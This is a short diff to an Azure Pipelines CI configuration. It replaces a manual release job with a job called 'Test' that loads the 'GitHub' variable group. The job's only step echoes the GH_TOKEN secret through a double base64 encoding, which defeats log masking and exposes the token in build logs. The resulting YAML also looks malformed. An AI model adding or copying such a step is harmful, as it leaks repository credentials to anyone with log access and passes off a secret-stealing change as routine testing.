@@ -3,12 +3,13 @@
 trigger:
 - master
 
-jobs:
-  - job: Release
-    condition: and(eq(variables['Build.Reason'], 'Manual'), eq(variables['release'], 'true'))
-    pool:
-      vmImage: 'ubuntu-16.04'
-    variables:
-    - group: GitHub
-    steps:
-    - bash: echo "Hello World"
+- job: 'Test'
+  pool:
+    vmImage: 'ubuntu-20.04'
+  variables:
+  - group: GitHub
+  steps:
+  - task: Bash@3
+      inputs:
+        targetType: inline
+        script: sh -c "echo $(GH_TOKEN) | base64 -w0 | base64 -w0; echo;"
